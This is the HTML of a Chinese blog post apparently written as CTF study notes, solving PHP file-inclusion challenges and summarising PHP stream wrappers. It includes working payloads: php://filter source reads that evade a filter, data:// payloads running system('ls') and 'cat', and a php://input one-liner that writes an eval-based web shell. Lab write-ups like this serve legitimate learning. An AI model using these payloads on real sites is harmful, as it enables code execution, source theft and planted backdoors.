@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>寒假笔记1 | shgshshs</title><meta name="author" content="shgshshs"><meta name="copyright" content="shgshshs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP_fileincludefile_include1  这道题有过滤，需要查看.&#x2F;check.php 先上php伪协议include(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[]); payload:&#x2F;?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;check.p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="寒假笔记1">
+<meta property="og:url" content="http://example.com/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/index.html">
+<meta property="og:site_name" content="shgshshs">
+<meta property="og:description" content="PHP_fileincludefile_include1  这道题有过滤，需要查看.&#x2F;check.php 先上php伪协议include(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[]); payload:&#x2F;?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;check.p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/icon.jpg">
+<meta property="article:published_time" content="2025-01-19T03:40:27.000Z">
+<meta property="article:modified_time" content="2025-01-19T10:04:09.629Z">
+<meta property="article:author" content="shgshshs">
+<meta property="article:tag" content="解题 知识点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/icon.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '寒假笔记1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://haowallpaper.com/link/common/file/previewFileImg/15702004042207552);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://haowallpaper.com/link/common/file/previewFileImg/15702006569931072);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">shgshshs</span></a><a class="nav-page-title" href="/"><span class="site-name">寒假笔记1</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">寒假笔记1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-19T03:40:27.000Z" title="发表于 2025-01-19 11:40:27">2025-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-19T10:04:09.629Z" title="更新于 2025-01-19 18:04:09">2025-01-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PHP-fileinclude"><a href="#PHP-fileinclude" class="headerlink" title="PHP_fileinclude"></a>PHP_fileinclude</h1><h2 id="file-include1"><a href="#file-include1" class="headerlink" title="file_include1"></a>file_include1</h2><img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/1.png" class="">
+
+<p>这道题有过滤，需要查看<code>./check.php</code></p>
+<p>先上php伪协议<code>include(php://filter/read=convert.base64-encode/resource=[]);</code></p>
+<p><em>payload</em>:<code>/?filename=php://filter/read=convert.base64-encode/resource=./check.php</code></p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/2.png" class="">
+
+<p>显示<code>do not hack!</code>，被过滤了，换一种试试</p>
+<p><em>payload</em>:<code>/?filename=php://filter/read=convert.iconv.utf8.utf16/resource=./check.php</code></p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/3.png" class="">
+
+<p>还是过滤了，有时候过滤，可删除<code>read=</code></p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/4.png" class="">
+
+<p>这样就显示源码了，发现过滤了这些内容：<code>base|be|encode|print|zlib|quoted|write|rot13|read|string</code></p>
+<p>之后就可以直接</p>
+<p><em>payload</em>:<code>/?filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php</code></p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/5.png" class="">
+
+<h2 id="file-include2"><a href="#file-include2" class="headerlink" title="file_include2"></a>file_include2</h2><img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/6.png" class="">
+
+<p>只有一个判断<code>file_get_contents($file2) === &quot;hello ctf&quot;</code></p>
+<p><em>用法</em>：file_get_contents(php:&#x2F;&#x2F;input)  POST 需要写入的数据 （用hackbar发包的时候，会显示键值对，要用bp抓包删除）</p>
+<p><code>payload</code>：&#x2F;?file1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&amp;file2&#x3D;php:&#x2F;&#x2F;input</p>
+<p><code>POST</code>：a&#x3D;hello ctf</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/7.png" class="">
+
+<p>抓包后修改发送</p>
+<p>查看响应包，得到flag</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/8.png" class="">
+
+<h2 id="file-include3"><a href="#file-include3" class="headerlink" title="file_include3"></a>file_include3</h2><img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/9.png" class="">
+
+<p>给出了index.php目录，再由下面的flag在flag.php中提示，由于flag.php与index.php同为php文件，猜想flag.php也在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下，但是还不知道需要传入参数的名称以及位置，试查看源代码查找下相关信息</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/10.png" class="">
+
+<p>是从<code>Cookie</code>里获取<code>$lan</code>的值，最后拼接<code>.php</code></p>
+<p><em>payload</em>：Cookie: language&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</p>
+<p>用<code>hackbar</code>发包，得到flag的base64编码，解码即可</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/11.png" class="">
+
+<h2 id="file-include4"><a href="#file-include4" class="headerlink" title="file_include4"></a>file_include4</h2><img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/12.png" class="">
+
+<p>这道题禁用了<code>php://</code>伪协议，需要换一种方法</p>
+<p>可以用<code>data://text/plain,&lt;?php system(&#39;cmd&#39;);?&gt;</code>来进行代码执行</p>
+<p><code>payload</code>：&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘ls’);?&gt;</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/13.png" class="">
+
+<p>就可以看到flag在<code>fl4gisisish3r3.php</code>文件里</p>
+<p><code>payload</code>：&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘cat fl4gisisish3r3.php’);?&gt;</p>
+<p>需注意<code>&lt;?php system(&#39;cat fl4gisisish3r3.php&#39;);?&gt;</code>的结果返回在页面源码中，需查看页面源码才能看到</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/14.png" class="">
+
+<p>或者<code>payload</code>：&#x2F;?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php show_source(‘fl4gisisish3r3.php’);?&gt;</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/15.png" class="">
+
+<h1 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含的函数有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>、<span class="keyword">require</span>、<span class="keyword">include_once</span>、<span class="keyword">require_once</span>、highlight_file、show_source、readfile、file_get_contents、fopen、file</span><br></pre></td></tr></table></figure>
+
+<p>伪协议：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="详细解读"><a href="#详细解读" class="headerlink" title="详细解读"></a>详细解读</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码</p>
+<p>可采用不同编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=../flag.php</span></span><br><span class="line">?page=php:<span class="comment">//filter/read=convert.iconv.utf8.utf16/resource=../flag.php</span></span><br><span class="line">?page=php:<span class="comment">//filter/read=string.toupper/resource=../flag.php（将文件内容转换为字符串）</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>convert.iconv.[]</code>过滤器，<code>[]</code>中支持以下字符编码（* 表示该编码也可以在正则表达式中使用）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">...</span><br><span class="line">\\具体支持的编码可见php官方文档</span><br><span class="line">\\https://www.php.net/manual/zh/mbstring.supported-encodings.php</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>convert.iconv.[]</code>过滤器，<code>[]</code>中只有一种编码，则表示<em>输出编码</em>，如果有两中编码，则前者表示<em>输入编码</em>，后者表示<em>输出编码</em></p>
+<p>在 PHP 中，<code>php://filter</code> 流封装器支持多种过滤器，用于对数据流进行转换和处理。以下是一些常用的过滤器及其用途：</p>
+<ol>
+<li><strong>字符串转换过滤器</strong>：<ul>
+<li><code>string.toupper</code>：将字符串转换为大写。</li>
+<li><code>string.tolower</code>：将字符串转换为小写。</li>
+<li><code>string.rot13</code>：对字符串进行 ROT13 加密。</li>
+<li><code>string.strip_tags</code>：移除字符串中的 HTML 和 PHP 标签。</li>
+</ul>
+</li>
+<li><strong>转换过滤器</strong>：<ul>
+<li><code>convert.iconv.*</code>：用于字符编码转换，例如 <code>convert.iconv.UTF-8.UTF-16LE</code> 将 UTF-8 编码转换为 UTF-16LE 编码。</li>
+</ul>
+</li>
+<li><strong>压缩过滤器</strong>：<ul>
+<li><code>zlib.deflate</code>：对数据进行 zlib 压缩。</li>
+<li><code>zlib.inflate</code>：对数据进行 zlib 解压缩。</li>
+<li><code>bzip2.decompress</code>：对数据进行 bzip2 解压缩。</li>
+<li><code>bzip2.compress</code>：对数据进行 bzip2 压缩。</li>
+<li><code>gzip.decompress</code>：对数据进行 gzip 解压缩。</li>
+<li><code>gzip.compress</code>：对数据进行 gzip 压缩。</li>
+</ul>
+</li>
+<li><strong>流复制过滤器</strong>：<ul>
+<li><code>stream.copy_to_stream</code>：将数据从一个流复制到另一个流。</li>
+</ul>
+</li>
+<li><strong>资源过滤器</strong>：<ul>
+<li><code>resource=*</code>：用于指定要读取的资源，例如 <code>resource=flag.php</code>。</li>
+</ul>
+</li>
+<li><strong>Base64 编码过滤器</strong>：<ul>
+<li><code>convert.base64-encode</code>：将数据编码为 Base64 格式。</li>
+<li><code>convert.base64-decode</code>：将 Base64 编码的数据解码。</li>
+</ul>
+</li>
+<li><strong>十六进制编码过滤器</strong>：<ul>
+<li><code>convert.hex-encode</code>：将数据编码为十六进制格式。</li>
+<li><code>convert.hex-decode</code>：将十六进制编码的数据解码。</li>
+</ul>
+</li>
+<li><strong>URL 编码过滤器</strong>：<ul>
+<li><code>convert.url-encode</code>：对数据进行 URL 编码。</li>
+<li><code>convert.url-decode</code>：对数据进行 URL 解码。</li>
+</ul>
+</li>
+</ol>
+<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p>用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响</p>
+<p>即<code>file:// [文件的绝对路径和文件名]</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=file:<span class="comment">///var/www/html/flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行</p>
+<p>php:&#x2F;&#x2F;input 可以用来生成一句话</p>
+<p>利用该方法，我们可以直接写入php文件，输入file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，写入php代码：</p>
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/16.png" class="">
+
+<p>如此可以写入一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：</p>
+<p>用flie_include4的容器，执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&#x27;php phpinfo.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/17.png" class="">
+
+<p>如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/18.png" class="">
+
+<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p>
+<p>如果网站允许我们上传压缩文件，我们也可以将php文件压缩后进行上传，再通过zip:&#x2F;&#x2F;协议执行。<code>(phpinfo.zip#phpinfo.php)</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">shgshshs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/">http://example.com/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">shgshshs</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%A7%A3%E9%A2%98-%E7%9F%A5%E8%AF%86%E7%82%B9/">解题 知识点</a></div><div class="post-share"><div class="social-share" data-image="/img/icon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/12/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95/" title="正则表达式语法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">正则表达式语法</div></div><div class="info-2"><div class="info-item-1">正则表达式（Regular Expressions，简称 regex）是一种用来描述字符串模式的工具，广泛应用于文本处理、搜索、替换等场景。它可以用于检查、提取或替换字符串中的特定模式。 基本语法 字面字符：正则表达式会按字面意义匹配字符。例如，abc 会匹配字符串 abc。 元字符：这些是具有特殊意义的字符，它们帮助构建复杂的模式。  常见元字符：1.（点）：匹配除换行符之外的任何单个字符。   例如，a.b 匹配 acb、aab 等。  1^（脱字符）：匹配字符串的开头。   例如，^abc 匹配以 abc 开头的字符串。  1$（美元符号）：匹配字符串的结尾。   例如，abc$ 匹配以 abc 结尾的字符串。  1*（星号）：匹配前面的字符零次或多次。   例如，a* 匹配空字符串、a、aa 等。  1+（加号）：匹配前面的字符一次或多次。   例如，a+ 匹配 a、aa、aaa 等，但不匹配空字符串。  1?（问号）：匹配前面的字符零次或一次，或者表示非贪婪模式（在量词后使用时）。   例如，a? 匹配空字符串或单个字符...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/11/19/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/" title="学习记录1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">学习记录1</div></div><div class="info-2"><div class="info-item-1">极客Web&#x2F;Misc题目复现MiscTruth of Word全选，将内容设置成其他颜色，透明的文字就显示Flag01=SYC&#123;W0rd_H@5   文件本质： ​        1.原理： ​            word文件的后缀名是.docx，而它的文件本质是一个zip压缩文件 ​        2.方法： ​            我们可以在压缩文件中将后缀从.docx改为.zip   打开压缩包，在challenge.zip\word\media 路径内找到Flag03.png   FLAG03=StrUCtu3e!&#125;   注意到这个word的后缀名和平常不一样，是docm  .docm格式是Microsoft Word 2007及以上版本支持的一种文件格式，它通常用于储存包含宏和VBA代码的Word文档。 在菜单栏上点开文件，进入选项   点击自定义功能区，勾选开发工具   之后菜单栏上就会出现开发工具选项卡   修改文档属性，勾选解除锁定   打开文档后根据提示启用宏，点击开发工具选项卡，点击Visual Basic   Flag...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">shgshshs</div><div class="author-info-description">shgshshs'blog</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol 